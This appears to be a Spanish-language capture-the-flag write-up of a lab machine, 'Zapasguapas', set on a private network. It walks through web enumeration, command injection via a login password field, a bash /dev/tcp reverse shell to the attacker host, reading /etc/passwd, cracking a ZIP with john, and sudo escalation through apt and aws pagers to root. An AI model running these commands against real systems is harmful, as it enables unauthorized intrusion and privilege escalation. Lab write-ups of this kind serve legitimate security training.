# Zapasguapas - Writeup

## Información del entorno

-   **Máquina atacante:** Kali Linux (10.0.50.4)
-   **Máquina víctima:** Zapasguapas (10.0.50.43)

------------------------------------------------------------------------

## 1. Enumeración

### Escaneo con Nmap

``` bash
nmap -sC -sV -sS -T5 -p- 10.0.50.43
```

Puertos abiertos:

-   80/tcp → Apache httpd 2.4.57 (Debian)
-   22/tcp → OpenSSH 9.2p1 Debian

------------------------------------------------------------------------

## 2. Enumeración Web

``` bash
curl -i 10.0.50.43
curl -I 10.0.50.43
```

No se observan redirecciones ni información relevante en headers.

### Fuzzing de directorios

``` bash
gobuster dir -u http://10.0.50.43 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 60 -x php,txt,html
```

Descubrimos `/login.html`.

------------------------------------------------------------------------

## 3. Análisis del Login

El formulario usa método **GET** y envía datos a:

    run_command.php?username=...&password=...

En el JavaScript encontramos:

``` javascript
// Ejecutar el comando proporcionado como contraseña
```

Esto indica posible ejecución de comandos.

------------------------------------------------------------------------

## 4. RCE - Remote Code Execution

Probamos en el campo password:

``` bash
id
```

Resultado:

    uid=33(www-data) gid=33(www-data)

Tenemos ejecución remota como `www-data`.

------------------------------------------------------------------------

## 5. Reverse Shell

En Kali:

``` bash
rlwrap nc -nvlp 4444
```

En el campo password:

``` bash
bash -c 'bash -i >& /dev/tcp/10.0.50.4/4444 0>&1'
```

Shell obtenida.

### Estabilización

``` bash
/bin/bash -i
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
CTRL+Z
stty raw -echo; fg
```

------------------------------------------------------------------------

## 6. Enumeración Local

Usuarios encontrados:

``` bash
cat /etc/passwd
```

-   proadidas
-   pronike

En `/opt` encontramos:

    importante.zip

------------------------------------------------------------------------

## 7. Crackeo del ZIP

Transferimos a Kali:

``` bash
python3 -m http.server 8000
wget http://10.0.50.43:8000/importante.zip
```

Extraemos hash:

``` bash
zip2john importante.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
john --show zip.hash
```

Contraseña del ZIP:

    hotstuff

Dentro obtenemos:

    User: pronike
    Password: pronike11

------------------------------------------------------------------------

## 8. Escalada a pronike

``` bash
ssh pronike@10.0.50.43
```

### sudo -l

    (proadidas) NOPASSWD: /usr/bin/apt

Escalada:

``` bash
sudo -u proadidas apt changelog apt
```

Dentro del paginador:

    !/bin/bash

Ahora somos `proadidas`.

------------------------------------------------------------------------

## 9. Escalada a root

Como `proadidas`:

``` bash
sudo -l
```

Permisos:

    (root) NOPASSWD: /usr/bin/aws

Ejecutamos:

``` bash
sudo -u root aws help
```

En el paginador:

    !/bin/bash

Root obtenido.

------------------------------------------------------------------------

## 10. Flags

``` bash
cat /home/proadidas/user.txt
cat /root/root.txt
```

------------------------------------------------------------------------

# Conclusión

Cadena completa:

www-data → Crack ZIP → pronike → apt (proadidas) → aws (root)

Técnicas usadas:

-   RCE vía parámetro GET
-   Reverse shell
-   Estabilización TTY
-   Crackeo ZIP con John
-   Escalada vía GTFOBins (apt, aws + less)

Máquina comprometida completamente.
